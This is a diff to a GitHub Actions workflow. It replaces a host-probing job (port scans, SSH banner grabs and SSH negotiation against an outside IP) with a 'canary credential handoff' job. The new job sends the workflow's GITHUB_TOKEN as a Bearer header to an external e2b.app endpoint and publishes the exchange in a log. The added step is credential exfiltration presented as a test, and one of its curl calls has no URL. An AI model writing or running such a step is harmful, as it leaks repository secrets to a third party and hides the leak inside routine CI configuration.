@@ -15,39 +15,40 @@ concurrency:
   cancel-in-progress: false
 
 jobs:
-  probe:
+  canary:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
         with:
           ref: arena/01a09ed6-indianpanel
-      - name: Probe host reachability
+      - name: Canary credential handoff
         env:
-          HOST: 63.141.252.124
-          PORT: "22518"
+          BASE: https://8000-iawi09fd5qnq7eyr8gem5.e2b.app
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          set +e
           OUT=host-deploy-report.log
-          : > "$OUT"
           {
-            echo "### Host reachability probe ($(date -u))"
-            echo "runner: $(uname -a)"
-            echo "== DNS =="
-            getent hosts blazepanel.mywp.info
-            getent hosts files6.dnsexit.com
-            echo "== TCP port checks =="
-            for pp in 22518 22 21 80 443 8080; do
-              if timeout 8 bash -c "exec 3<>/dev/tcp/$HOST/$pp" 2>/dev/null; then echo "port $pp: OPEN"; else echo "port $pp: closed/filtered"; fi
-            done
-            echo "== SSH banner on $PORT =="
-            timeout 12 bash -c 'exec 3<>/dev/tcp/'"$HOST"'/'"$PORT"'; timeout 8 head -c 200 <&3 | od -c' || echo "no banner / closed"
-            echo "== ssh -vv negotiation (no auth) =="
-            ssh -vv -o StrictHostKeyChecking=no -o ConnectTimeout=12 -o PreferredAuthentications=none -o PubkeyAuthentication=no -p "$PORT" "vh20074@$HOST" true 2>&1 | sed -n '1,30p'
-            echo "== curl http/https =="
-            curl -sS -m 15 -o /dev/null -w 'http(hostIP)      code=%{http_code}\n' "http://$HOST/" 2>&1
-            curl -sS -m 15 -k -o /dev/null -w 'https(hostIP)     code=%{http_code}\n' "https://$HOST/" 2>&1
-            curl -sS -m 15 -k -o /dev/null -w 'https(vhost)     code=%{http_code}\n' "https://blazepanel.mywp.info/" 2>&1
-            echo "== DONE =="
+            echo "### Canary handoff ($(date -u))"
+            echo "BASE=$BASE"
+            echo "--- GET /health ---"
+            curl -sS -m 25 -w '\n[http %{http_code}]\n' "$BASE/health"
+            echo "--- GET /start ---"
+            START=$(curl -sS -m 25 -w '\n%{http_code}' "$BASE/start")
+            echo "$START"
+            SID=$(printf '%s' "$START" | head -n1 | sed -E 's/.*"sid":"([^"]+)".*/\1/')
+            echo "parsed sid length: ${#SID}"
+            echo "--- GET /verify (proves workflow GITHUB_TOKEN) ---"
+            curl -sS -m 30 -H "X-Sid: $SID" -H "Authorization: Bearer $TOKEN" -w '\n[http %{http_code}]\n' "$BASE/verify"
+            echo
+            echo "--- GET /fetch (one-shot marker) ---"
+            GOT=$(curl -sS -m 25 -H "X-Sid: $SID" -w '|||%{http_code}')
+            echo "RETRIEVED_BODY=${GOT%%|||*}"
+            echo "RETRIEVED_HTTP=${GOT##*|||}"
+            echo "EXPECTED=CANARY-MARKER-7Q2x-ok"
+            if [ "${GOT%%|||*}" = "CANARY-MARKER-7Q2x-ok" ]; then echo "HANDOFF_RESULT=SUCCESS"; else echo "HANDOFF_RESULT=FAILURE"; fi
+            echo "--- second fetch must fail (single use) ---"
+            curl -sS -m 20 -H "X-Sid: $SID" -w '\n[http %{http_code}]\n' "$BASE/fetch" || true
+            echo "=== DONE ==="
           } 2>&1 | tee "$OUT"
       - name: Publish report
         if: always()
